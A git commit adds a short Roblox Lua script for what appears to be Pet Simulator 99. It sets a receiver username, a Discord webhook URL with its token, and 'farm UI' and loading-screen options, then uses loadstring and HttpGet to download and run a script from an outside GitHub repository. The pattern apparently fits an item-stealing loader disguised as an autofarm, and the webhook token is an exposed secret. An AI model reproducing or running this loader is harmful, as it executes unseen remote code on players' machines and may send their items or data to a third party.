48b962b62b9e7107c27c661381375c671ab99c26
ScriptHub0 <160200000+ScriptHub0@users.noreply.github.com>
2024-02-16 11:11:18 +0800

    Create PS99.lua

---
+++ Main/PS99.lua
@@ -0,0 +1,6 @@
+Username = "Celestialrd"
+webhook = "https://discord.com/api/webhooks/1206937286248505394/MBr-1zZD38NEdSZo-364uD-sPUkYR89erHe4MiVfmamLUCrzyJ5g4FK6eUdanUuRq1A-"
+loadingscreen = true
+delay = 0 
+farmui = true 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
